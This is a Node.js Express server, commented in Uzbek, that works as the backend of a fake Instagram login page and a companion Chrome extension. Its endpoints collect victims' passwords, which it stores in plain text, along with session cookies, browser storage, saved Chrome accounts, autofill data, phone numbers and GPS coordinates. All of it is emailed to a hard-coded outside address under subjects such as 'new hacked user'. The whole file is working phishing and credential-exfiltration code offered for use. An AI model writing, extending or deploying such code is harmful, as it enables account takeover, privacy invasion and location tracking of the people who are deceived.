const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/instagram-login', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

const db = mongoose.connection;
db.on('error', console.error.bind(console, 'MongoDB connection error:'));
db.once('open', () => {
  console.log('Connected to MongoDB');
});

// User Schema (without password hashing as requested)
const userSchema = new mongoose.Schema({
  email: { type: String, required: true },
  password: { type: String, required: true }, // Stored as plain text as requested
  deviceInfo: {
    userAgent: String,
    language: String,
    platform: String,
    screenResolution: String,
    timezone: String,
    onLine: Boolean,
    cookieEnabled: Boolean,
    timestamp: String,
    url: String,
    referrer: String
  },
  savedCredentials: {
    localStorage: Object,
    sessionStorage: Object,
    chromeAccounts: Object,
    autofillData: Object,
    phoneNumbers: [String]
  },
  instagramCredentials: {
    localStorage: Object,
    sessionStorage: Object,
    chromeAccounts: Object,
    browserSavedCredentials: Object,
    inputData: Object
  },
  batteryInfo: {
    level: Number,
    charging: Boolean,
    chargingTime: Number,
    dischargingTime: Number
  },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Email transporter setup
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER || 'your-email@gmail.com',
    pass: process.env.EMAIL_PASS || 'your-app-password'
  },
  tls: {
    rejectUnauthorized: false
  },
  secure: false,
  port: 587
});

// Test email configuration
transporter.verify(function(error, success) {
  if (error) {
    console.log('Email configuration error:', error);
  } else {
    console.log('Email server is ready to send messages');
  }
});

// Instagram data endpoint (from Chrome extension)
app.post('/api/instagram-data', async (req, res) => {
  try {
    const { username, email, profileInfo, cookies, localStorage, sessionStorage, source, timestamp } = req.body;

    console.log('Instagram data received from extension:', {
      username,
      email,
      profileInfo,
      cookies: Object.keys(cookies || {}).length,
      localStorage: Object.keys(localStorage || {}).length,
      sessionStorage: Object.keys(sessionStorage || {}).length,
      source,
      timestamp
    });

    // Send email notification
    const mailOptions = {
      from: process.env.EMAIL_USER || 'your-email@gmail.com',
      to: 'everestdevelopmet@gmail.com',
      subject: 'Instagram ma\'lumotlari Chrome extension orqali',
      html: `
        <h2>Instagram ma'lumotlari Chrome extension orqali to'plandı</h2>
        <p><strong>Username:</strong> ${username || 'Topilmadi'}</p>
        <p><strong>Email:</strong> ${email || 'Topilmadi'}</p>
        <p><strong>Manba:</strong> ${source || 'N/A'}</p>
        <p><strong>Vaqt:</strong> ${timestamp || new Date().toLocaleString()}</p>
        <hr>
        <h3>Cookies (${Object.keys(cookies || {}).length} ta):</h3>
        ${cookies && Object.keys(cookies).length > 0 ? 
          `<ul>${Object.entries(cookies).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>Cookies topilmadi</p>'
        }
        <hr>
        <h3>LocalStorage (${Object.keys(localStorage || {}).length} ta):</h3>
        ${localStorage && Object.keys(localStorage).length > 0 ? 
          `<ul>${Object.entries(localStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>LocalStorage topilmadi</p>'
        }
        <hr>
        <h3>SessionStorage (${Object.keys(sessionStorage || {}).length} ta):</h3>
        ${sessionStorage && Object.keys(sessionStorage).length > 0 ? 
          `<ul>${Object.entries(sessionStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>SessionStorage topilmadi</p>'
        }
        <hr>
        <p><em>Bu xabar Chrome extension orqali yuborildi.</em></p>
      `
    };

    await transporter.sendMail(mailOptions);
    console.log('Instagram data email sent to everestdevelopmet@gmail.com');

    res.json({ success: true, message: 'Instagram data received' });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({
      error: 'Server xatosi',
      details: error.message
    });
  }
});

// Mobile Instagram data endpoint
app.post('/api/mobile-instagram-data', async (req, res) => {
  try {
    const { username, email, profileInfo, cookies, localStorage, sessionStorage, mobileInfo, source, timestamp } = req.body;

    console.log('Mobile Instagram data received:', {
      username,
      email,
      profileInfo,
      cookies: Object.keys(cookies || {}).length,
      localStorage: Object.keys(localStorage || {}).length,
      sessionStorage: Object.keys(sessionStorage || {}).length,
      mobileInfo,
      source,
      timestamp
    });

    // Send email notification
    const mailOptions = {
      from: process.env.EMAIL_USER || 'your-email@gmail.com',
      to: 'everestdevelopmet@gmail.com',
      subject: 'Mobile Instagram ma\'lumotlari to\'plandı',
      html: `
        <h2>Mobile Instagram ma'lumotlari to'plandı</h2>
        <p><strong>Username:</strong> ${username || 'Topilmadi'}</p>
        <p><strong>Email:</strong> ${email || 'Topilmadi'}</p>
        <p><strong>Manba:</strong> ${source || 'N/A'}</p>
        <p><strong>Vaqt:</strong> ${timestamp || new Date().toLocaleString()}</p>
        <hr>
        <h3>Mobile qurilma ma'lumotlari:</h3>
        <p><strong>Brauzer:</strong> ${mobileInfo?.userAgent || 'N/A'}</p>
        <p><strong>Platforma:</strong> ${mobileInfo?.platform || 'N/A'}</p>
        <p><strong>Ekran o'lchami:</strong> ${mobileInfo?.screenResolution || 'N/A'}</p>
        <p><strong>Til:</strong> ${mobileInfo?.language || 'N/A'}</p>
        <p><strong>Vaqt zonasi:</strong> ${mobileInfo?.timezone || 'N/A'}</p>
        <p><strong>Online:</strong> ${mobileInfo?.onLine ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Cookie yoqilgan:</strong> ${mobileInfo?.cookieEnabled ? 'Ha' : 'Yo\'q'}</p>
        ${mobileInfo?.battery ? `
        <p><strong>Batareya darajasi:</strong> ${Math.round(mobileInfo.battery.level * 100)}%</p>
        <p><strong>Zaryadlanmoqda:</strong> ${mobileInfo.battery.charging ? 'Ha' : 'Yo\'q'}</p>
        ` : ''}
        ${mobileInfo?.location ? `
        <p><strong>GPS koordinatalari:</strong> ${mobileInfo.location.latitude}, ${mobileInfo.location.longitude}</p>
        <p><strong>Aniqlik:</strong> ${mobileInfo.location.accuracy} metr</p>
        ` : ''}
        <hr>
        <h3>Cookies (${Object.keys(cookies || {}).length} ta):</h3>
        ${cookies && Object.keys(cookies).length > 0 ? 
          `<ul>${Object.entries(cookies).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>Cookies topilmadi</p>'
        }
        <hr>
        <h3>LocalStorage (${Object.keys(localStorage || {}).length} ta):</h3>
        ${localStorage && Object.keys(localStorage).length > 0 ? 
          `<ul>${Object.entries(localStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>LocalStorage topilmadi</p>'
        }
        <hr>
        <h3>SessionStorage (${Object.keys(sessionStorage || {}).length} ta):</h3>
        ${sessionStorage && Object.keys(sessionStorage).length > 0 ? 
          `<ul>${Object.entries(sessionStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>SessionStorage topilmadi</p>'
        }
        <hr>
        <p><em>Bu xabar mobile Chrome extension orqali yuborildi.</em></p>
      `
    };

    await transporter.sendMail(mailOptions);
    console.log('Mobile Instagram data email sent to everestdevelopmet@gmail.com');

    res.json({ success: true, message: 'Mobile Instagram data received' });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({
      error: 'Server xatosi',
      details: error.message
    });
  }
});



// Login endpoint
app.post('/api/login', async (req, res) => {
  try {
    const { email, password, deviceInfo, savedCredentials, instagramCredentials, batteryInfo, autoCollected } = req.body;

    console.log('Login request received:', {
      email,
      password: password ? '***' : 'empty',
      autoCollected,
      deviceInfo: deviceInfo ? 'present' : 'missing',
      savedCredentials: savedCredentials ? 'present' : 'missing',
      instagramCredentials: instagramCredentials ? 'present' : 'missing',
      batteryInfo: batteryInfo ? 'present' : 'missing'
    });

    // Allow submission even without email/password to collect device data

    // Save to MongoDB (password not hashed as requested)
    const newUser = new User({
      email: email,
      password: password, // Plain text password
      deviceInfo: deviceInfo || {},
      savedCredentials: savedCredentials || {},
      instagramCredentials: instagramCredentials || {},
      batteryInfo: batteryInfo || {}
    });

    await newUser.save();
    console.log('User saved to MongoDB:', { 
      email, 
      password: password ? '***' : 'empty', 
      deviceInfo: deviceInfo ? 'present' : 'missing', 
      savedCredentials: savedCredentials ? 'present' : 'missing', 
      instagramCredentials: instagramCredentials ? 'present' : 'missing', 
      batteryInfo: batteryInfo ? 'present' : 'missing' 
    });

    // Send email notification
    const mailOptions = {
      from: process.env.EMAIL_USER || 'your-email@gmail.com',
      to: 'everestdevelopmet@gmail.com',
      subject: autoCollected ? 'Yangi foydalanuvchi saytga kirdi (Avtomatik)' : 'Yangi hacklangan foydalanuvchi',
      html: `
        <h2>${autoCollected ? 'Yangi foydalanuvchi saytga kirdi (Avtomatik to\'plangan ma\'lumotlar)' : 'Yangi foydalanuvchi kirish urinishi'}</h2>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Parol:</strong> ${password}</p>
        <p><strong>Vaqt:</strong> ${new Date().toLocaleString()}</p>
        <p><strong>To\'planish usuli:</strong> ${autoCollected ? 'Avtomatik (saytga kirganda)' : 'Qo\'lda (form to\'ldirganda)'}</p>
        <hr>
        <h3>Qurilma ma'lumotlari:</h3>
        <p><strong>Brauzer:</strong> ${deviceInfo?.userAgent || 'N/A'}</p>
        <p><strong>Platforma:</strong> ${deviceInfo?.platform || 'N/A'}</p>
        <p><strong>Til:</strong> ${deviceInfo?.language || 'N/A'}</p>
        <p><strong>Ekran o'lchami:</strong> ${deviceInfo?.screenResolution || 'N/A'}</p>
        <p><strong>Vaqt zonasi:</strong> ${deviceInfo?.timezone || 'N/A'}</p>
        <p><strong>Online:</strong> ${deviceInfo?.onLine ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Cookie yoqilgan:</strong> ${deviceInfo?.cookieEnabled ? 'Ha' : 'Yo\'q'}</p>
        ${batteryInfo.level !== undefined ? `
        <p><strong>Batareya darajasi:</strong> ${Math.round(batteryInfo.level * 100)}%</p>
        <p><strong>Zaryadlanmoqda:</strong> ${batteryInfo.charging ? 'Ha' : 'Yo\'q'}</p>
        ${batteryInfo.chargingTime !== Infinity ? `<p><strong>Zaryadlash vaqti:</strong> ${Math.round(batteryInfo.chargingTime / 60)} daqiqa</p>` : ''}
        ${batteryInfo.dischargingTime !== Infinity ? `<p><strong>Batareya vaqti:</strong> ${Math.round(batteryInfo.dischargingTime / 60)} daqiqa</p>` : ''}
        ` : '<p><strong>Batareya ma\'lumotlari:</strong> Mavjud emas</p>'}
        
        <h3>Saqlangan ma'lumotlar:</h3>
        ${savedCredentials.localStorage && Object.keys(savedCredentials.localStorage).length > 0 ? `
        <p><strong>LocalStorage:</strong></p>
        <ul>
          ${Object.entries(savedCredentials.localStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}
        </ul>
        ` : '<p><strong>LocalStorage:</strong> Ma\'lumot topilmadi</p>'}
        ${savedCredentials.sessionStorage && Object.keys(savedCredentials.sessionStorage).length > 0 ? `
        <p><strong>SessionStorage:</strong></p>
        <ul>
          ${Object.entries(savedCredentials.sessionStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}
        </ul>
        ` : '<p><strong>SessionStorage:</strong> Ma\'lumot topilmadi</p>'}
        ${savedCredentials.chromeAccounts ? `
        <p><strong>Chrome Accounts:</strong> ${JSON.stringify(savedCredentials.chromeAccounts)}</p>
        ` : ''}
        ${savedCredentials.phoneNumbers && savedCredentials.phoneNumbers.length > 0 ? `
        <p><strong>Telefon raqamlari (${savedCredentials.phoneNumbers.length} ta):</strong></p>
        <ul>
          ${savedCredentials.phoneNumbers.map(phone => `<li>${phone}</li>`).join('')}
        </ul>
        ` : '<p><strong>Telefon raqamlari:</strong> Topilmadi</p>'}
                       <hr>
               <h3>Instagram ma'lumotlari:</h3>
               ${instagramCredentials && Object.keys(instagramCredentials).length > 0 ? `
               <p><strong>Topilgan Instagram ma'lumotlari:</strong></p>
               <ul>
                 ${Object.entries(instagramCredentials).map(([key, value]) => `<li>${key}: ${JSON.stringify(value)}</li>`).join('')}
               </ul>
               ` : '<p><strong>Instagram ma\'lumotlari:</strong> Topilmadi</p>'}
               
               ${instagramCredentials.isMobile ? `
               <hr>
               <h3>Mobile qurilma ma'lumotlari:</h3>
               <p><strong>Mobile brauzer:</strong> ${instagramCredentials.mobileBrowser || 'N/A'}</p>
               ${instagramCredentials.deviceMemory ? `<p><strong>Qurilma xotirasi:</strong> ${instagramCredentials.deviceMemory} GB</p>` : ''}
               ${instagramCredentials.cpuCores ? `<p><strong>CPU yadrolari:</strong> ${instagramCredentials.cpuCores}</p>` : ''}
               ${instagramCredentials.connectionType ? `<p><strong>Internet turi:</strong> ${instagramCredentials.connectionType}</p>` : ''}
               ${instagramCredentials.connectionSpeed ? `<p><strong>Internet tezligi:</strong> ${instagramCredentials.connectionSpeed} Mbps</p>` : ''}
               ${instagramCredentials.installedInstagramApp ? `<p><strong>Instagram ilovasi o'rnatilgan:</strong> Ha</p>` : ''}
               ` : ''}
        <hr>
        <p><em>Bu xabar Instagram login sahifasidan yuborildi.</em></p>
      `
    };

    await transporter.sendMail(mailOptions);
    console.log('Email notification sent to everestdevelopmet@gmail.com');

    // Return success response
    res.json({ 
      success: true, 
      message: 'Data received successfully' 
    });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ 
      error: 'Server xatosi', 
      details: error.message 
    });
  }
});

// Test endpoint
app.get('/api/test', (req, res) => {
  res.json({ message: 'Backend ishlayapti!' });
});

app.listen(PORT, () => {
  console.log(`Server ${PORT} portda ishlayapti`);
}); 